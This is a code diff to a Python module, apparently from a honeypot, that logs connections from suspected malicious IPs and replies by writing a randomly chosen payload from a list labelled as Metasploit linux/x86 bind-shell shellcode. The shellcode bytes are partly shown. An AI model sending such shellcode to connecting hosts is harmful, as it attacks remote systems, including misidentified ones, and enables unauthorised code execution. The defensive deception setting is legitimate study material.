@@ -3,8 +3,7 @@ from random import randint
 from services.utils import *
 
 
-class Tcprooter(Core):
-    PAYLOADS = [
+PAYLOADS = [
         #               linux/x86/shell_bind_tcp - 78 bytes
         #               http://www.metasploit.com
         #               InitialAutoRunScript=, PrependSetuid=false,
@@ -115,17 +114,17 @@ class Tcprooter(Core):
                 \x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5'''
     ]
 
-    SEND = True
 
-    def __init__(self):
-        super().__init__()
+def run_tcprooter(writer, malicious_ip, msg):
+    log.sintetic_write(log.WARNING, "TCPROOTER",
+                       "detected activity from IP {} - content: {}".format(malicious_ip, msg))
 
-    def run(self, writer, malicious_ip, msg):
-        log.sintetic_write(log.WARNING, "TCPROOTER",
-                           "detected activity from IP {} - content: {}".format(malicious_ip, msg))
-        if Tcprooter.SEND:
-            # Random version
-            writer.write(Tcprooter.PAYLOADS[randint(0, len(Tcprooter.PAYLOADS) - 1)].encode(Core.FORMAT))
-            # writer.write(Tcprooter.PAYLOADS[1].encode(Core.FORMAT)) # Static version
-        # writer.shutdown(2)
-        writer.close()
+    # Random version
+    writer.write(PAYLOADS[randint(0, len(PAYLOADS) - 1)].encode(Core.FORMAT))
+
+    # Static version
+    # writer.write(Tcprooter.PAYLOADS[1].encode(Core.FORMAT))
+
+    writer.shutdown(Core.SHUT_RDWR)
+    writer.close()
+    return
